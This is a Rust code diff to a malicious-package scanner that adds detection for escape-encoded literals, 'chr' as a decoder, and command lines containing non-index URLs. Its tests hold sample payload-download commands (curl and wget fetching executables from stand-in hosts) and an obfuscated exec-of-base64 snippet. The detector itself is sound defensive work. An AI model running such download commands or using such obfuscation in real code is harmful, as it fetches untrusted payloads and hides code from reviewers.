@@ -128,6 +128,14 @@ pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintS
                             location: location(pg, n.file, n.span),
                             node: i,
                         });
+                    } else if n.kind == FlowNodeKind::Literal && escape_encoded(&n.label) {
+                        // The lexer is the decoder (ADR-028): `"\145\166\141\154"` is `eval`.
+                        out.push(TaintSource {
+                            kind: p.kind,
+                            pattern: QualifiedName::new("<escaped-literal>"),
+                            location: location(pg, n.file, n.span),
+                            node: i,
+                        });
                     }
                 }
             }
@@ -160,9 +168,13 @@ pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintS
 }
 
 /// The decoders whose result, applied to a constant, is a `DecodedLiteral`: ADR-018's list
-/// minus the entries that are not decoders (`chr`, `join`, reversal and re-encoding hide
-/// nothing from a reader). Canonical names, matched with `is_under`.
+/// minus the entries that are not decoders (`join`, reversal and re-encoding hide nothing
+/// from a reader). Canonical names, matched with `is_under`.
+///
+/// `chr` is one (ADR-028): `[101, 120, 101, 99]` hides `exec` from a reader as well as any
+/// base64 does, and it is how the commonest PyPI obfuscators spell their entry point.
 pub const DECODERS: &[&str] = &[
+    "chr",
     "base64.b64decode",
     "base64.standard_b64decode",
     "base64.urlsafe_b64decode",
@@ -238,6 +250,7 @@ pub fn literal_matches(pattern: &SourcePattern, value: &str) -> bool {
         TaintSourceKind::SensitiveFile => sensitive_path(pattern.pattern, value),
         TaintSourceKind::SuspiciousLiteral => match pattern.pattern {
             "<literal:url-not-index>" => url_not_index(value),
+            "<literal:command-with-url>" => command_with_url(value),
             "<literal:raw-ip>" => raw_ip(value),
             "<literal:shell-pipeline>" => shell_pipeline(value),
             "<literal:wallet-address>" => wallet_address(value),
@@ -378,8 +391,56 @@ fn sensitive_path(pattern: &str, value: &str) -> bool {
     }
 }
 
+/// Fewest escape-encoded printable characters that make a literal "encoded" (ADR-028).
+const MIN_ESCAPED_PRINTABLE: usize = 4;
+
+/// Whether a string literal, as written, spells printable ASCII in escape sequences
+/// (`\xHH`, `\ooo`, `\uHHHH`) for at least half of its characters. Labels keep escapes as
+/// written (`symbols::str_literal`), so this reads the source spelling. Non-printable
+/// escapes (`\x1b`, `\n`, `\x00`) are how control bytes and binary data are written and do
+/// not count: a printable character has no reason to be escaped except to hide it.
+pub(crate) fn escape_encoded(value: &str) -> bool {
+    let b = value.as_bytes();
+    let code = |digits: &[u8], radix: u32| {
+        std::str::from_utf8(digits)
+            .ok()
+            .and_then(|t| u32::from_str_radix(t, radix).ok())
+    };
+    let (mut escaped, mut chars, mut i) = (0usize, 0usize, 0usize);
+    while i < b.len() {
+        chars += 1;
+        if b[i] != b'\\' || i + 1 >= b.len() {
+            i += 1;
+            continue;
+        }
+        let (value, width) = match b[i + 1] {
+            b'x' if i + 4 <= b.len() => (code(&b[i + 2..i + 4], 16), 4),
+            b'u' if i + 6 <= b.len() => (code(&b[i + 2..i + 6], 16), 6),
+            b'0'..=b'7' => {
+                let end = (i + 2..(i + 4).min(b.len()))
+                    .find(|&j| !(b'0'..=b'7').contains(&b[j]))
+                    .unwrap_or((i + 4).min(b.len()));
+                (code(&b[i + 1..end], 8), end - i)
+            }
+            _ => (None, 2),
+        };
+        if value.is_some_and(|c| (0x20..0x7f).contains(&c)) {
+            escaped += 1;
+        }
+        i += width;
+    }
+    escaped >= MIN_ESCAPED_PRINTABLE && escaped * 2 >= chars
+}
+
+/// A whole literal that is a URL, not a template of one. A value with `{…}` holes
+/// (`https://github.com/{}/{}/pull/{}`, an f-string's text or a `.format` pattern) is a link
+/// being filled in, and matches only inside a command (`command_with_url`, ADR-028): seen on
+/// the development set, where libc's maintenance script hands such templates to `git`.
 fn url_not_index(value: &str) -> bool {
     let v = value.trim();
+    if v.contains('{') {
+        return false;
+    }
     let Some(rest) = ["http://", "https://", "ftp://"]
         .iter()
         .find_map(|scheme| v.strip_prefix(scheme))
@@ -394,6 +455,18 @@ fn url_not_index(value: &str) -> bool {
         .unwrap_or_default()
         .to_ascii_lowercase();
     !host.is_empty() && !OFFICIAL_INDEX_HOSTS.contains(&host.as_str())
+}
+
+/// A command line with a non-index URL among its words: `curl.exe -L https://h/a.exe -o x`
+/// (ADR-028). `url_not_index` needs the whole literal to be the URL, which a download
+/// command never is. Words are split on whitespace and stripped of quotes, so an f-string
+/// template's `"{}"` placeholders do not hide a neighbouring URL.
+fn command_with_url(value: &str) -> bool {
+    let words: Vec<&str> = value.split_whitespace().collect();
+    words.len() >= 2
+        && words
+            .iter()
+            .any(|w| url_not_index(w.trim_matches(|c| matches!(c, '"' | '\'' | '`'))))
 }
 
 fn raw_ip(value: &str) -> bool {
@@ -1038,15 +1111,63 @@ mod tests {
         assert!(sources.is_empty());
     }
 
+    // ADR-028: printable characters spelled as escapes are encoded; control bytes, binary
+    // data, regexes and a lone escaped character are how honest code writes escapes.
+    #[test]
+    fn escape_encoded_literals() {
+        for yes in [
+            r"\145\166\141\154",
+            r"\x65\x76\x61\x6c",
+            // `e…`, assembled so no tool decodes it on the way into this file.
+            concat!("\\", "u0065", "\\", "u0076", "\\", "u0061", "\\", "u006c"),
+            r"\x65\166\x61\154(x)",
+        ] {
+            assert!(escape_encoded(yes), "{yes}");
+        }
+        for no in [
+            r"\x1b[31m",
+            r"\n\t\r",
+            r"\x00\x01\x02\x03\x04",
+            r"\x89PNG\r\n\x1a\n",
+            r"\d+\.\d+\s*",
+            r"price: \x24 5",
+            "plain text",
+            r"\x41\x42\x43 followed by a much longer plain sentence",
+        ] {
+            assert!(!escape_encoded(no), "{no}");
+        }
+    }
+
+    #[test]
+    fn command_with_url_needs_a_command_around_a_non_index_url() {
+        assert!(command_with_url(
+            "curl.exe -L https://evil.invalid/a.exe -o x.exe"
+        ));
+        assert!(command_with_url("wget \"https://203.0.113.9/p\" -O /tmp/p"));
+        assert!(!command_with_url("https://evil.invalid/a.exe"));
+        assert!(!command_with_url(
+            "pip download https://files.pythonhosted.org/x.tar.gz"
+        ));
+        assert!(!command_with_url("git describe --tags"));
+        assert!(!command_with_url("https://github.com/{}/{}/pull/{}"));
+        assert!(command_with_url(
+            "curl.exe -L https://evil.invalid/a.exe -o \"{}\""
+        ));
+        assert!(!url_not_index("https://github.com/{}/{}.git"));
+    }
+
     // Numbers have no data-flow node, so a list of char codes is a constant leaf; the
-    // chr-join stage feeding a decoder still counts as constant input.
+    // chr-join stage feeding a decoder still counts as constant input. Since ADR-028 `chr`
+    // is a decoder itself, so each stage is a source, as with any chain of decoders.
     #[test]
     fn chr_join_of_a_number_list_is_constant_input() {
         let (sources, p) = decoded_paths(
             "import base64\n_CODES = [97, 87, 49]\n_S = ''.join(chr(c) for c in _CODES)\nexec(base64.b64decode(_S))\n",
         );
-        assert_eq!(sources.len(), 1);
-        assert_eq!(p.len(), 1);
+        let labels: Vec<_> = sources.iter().map(|s| s.pattern.as_str()).collect();
+        assert_eq!(labels.len(), 2, "{labels:?}");
+        assert!(labels.contains(&"chr") && labels.contains(&"base64.b64decode"));
+        assert_eq!(p.len(), 2);
     }
 
     // SensitiveFile: the path literal flows through expanduser, open and read into the
